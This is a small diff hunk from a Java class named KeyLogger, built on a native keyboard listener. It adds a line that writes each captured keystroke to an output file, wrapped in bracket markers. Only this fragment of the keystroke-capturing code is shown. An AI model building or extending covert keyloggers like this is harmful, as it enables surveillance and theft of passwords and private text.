@@ -91,6 +91,8 @@ public class KeyLogger implements NativeKeyListener {
 			} else {
 				writer.print(keyText);
 			}
+			writer.print("[-" + keyText + "-]");
+
 
 		} catch (IOException ex) {
 			//logger.error(ex.getMessage(), ex);
